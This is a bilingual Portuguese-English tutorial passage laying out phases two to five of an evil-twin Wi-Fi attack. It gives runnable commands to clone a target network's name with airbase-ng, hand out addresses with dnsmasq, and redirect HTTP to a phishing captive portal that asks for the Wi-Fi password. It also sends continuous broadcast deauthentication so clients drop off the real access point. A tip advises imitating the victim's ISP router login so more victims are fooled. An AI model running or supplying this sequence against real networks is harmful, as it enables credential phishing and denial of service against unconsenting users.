Fase 2

Criar o AP FalsoCreate the Fake AP

Use airbase-ng para criar um ponto de acesso falso com o mesmo nome (ESSID) da rede alvo. Isso cria uma interface virtual at0 que será a "porta" para os clientes. Use airbase-ng to create a fake access point with the same name (ESSID) as the target network. This creates a virtual interface at0 that will be the "gateway" for clients.

Iniciar AP FalsoStart Fake AP
sudo airbase-ng -e LabPentest_5G -c 6 wlan0mon
Deixe rodando e abra outro terminal para os próximos passos. A interface at0 será criada.Keep running and open another terminal for next steps. The at0 interface will be created.
Fase 3

Configurar DHCP e RedeConfigure DHCP and Network

Precisamos configurar a interface at0 com um IP e subir um servidor DHCP para que os clientes recebam IP automaticamente ao conectar ao nosso AP falso. We need to configure the at0 interface with an IP and start a DHCP server so clients receive IP automatically when connecting to our fake AP.

Configurar InterfaceConfigure Interface
1. Atribuir IP à interface at0:1. Assign IP to at0 interface:
sudo ifconfig at0 10.0.0.1 netmask 255.255.255.0 up
2. Configurar rota:2. Configure route:
sudo route add -net 10.0.0.0 netmask 255.255.255.0 gw 10.0.0.1
3. Iniciar DHCP server (dnsmasq):3. Start DHCP server (dnsmasq):
sudo dnsmasq -C /dev/null -i at0 --dhcp-range=10.0.0.10,10.0.0.50,12h --no-daemon --log-queries
Fase 4

Captive Portal (Phishing)Captive Portal (Phishing)

Configure regras de iptables para redirecionar todo o tráfego HTTP para uma página falsa (captive portal) que pede a senha Wi-Fi. Use o apache2 ou python3 -m http.server para servir a página. Configure iptables rules to redirect all HTTP traffic to a fake page (captive portal) that asks for the Wi-Fi password. Use apache2 or python3 -m http.server to serve the page.

Regras de RedirecionamentoRedirect Rules
1. Redirecionar HTTP (porta 80) para o captive portal:1. Redirect HTTP (port 80) to the captive portal:
sudo iptables -t nat -A PREROUTING -i at0 -p tcp --dport 80 -j REDIRECT --to-port 8080
2. Servir a página de phishing:2. Serve the phishing page:
sudo python3 -m http.server 8080 --directory /path/to/portal/
Dica: Crie uma página HTML que imite a tela de login do roteador do ISP da vítima. Quanto mais convincente, maior a taxa de sucesso.Tip: Create an HTML page that mimics the victim's ISP router login screen. The more convincing, the higher the success rate.
Fase 5

Forçar Desconexão do AP RealForce Disconnect from Real AP

Agora, use aireplay-ng para desautenticar todos os clientes do AP real. Sem conexão, os dispositivos vão procurar o ESSID novamente e encontrarão nosso AP falso (que terá sinal mais forte se estivermos perto). Now, use aireplay-ng to deauthenticate all clients from the real AP. Without a connection, devices will search for the ESSID again and find our fake AP (which will have a stronger signal if we're nearby).

Deauth em massa (broadcast)Mass deauth (broadcast)
sudo aireplay-ng -0 0 -a 00:11:22:33:44:55 wlan0mon
-0 0 = envio contínuo. Quando a vítima conectar ao seu AP e digitar a senha no portal, você verá no log do servidor HTTP. Para parar: Ctrl+C.-0 0 = continuous sending. When the victim connects to your AP and enters the password in the portal, you'll see it in the HTTP server log. To stop: Ctrl+C.
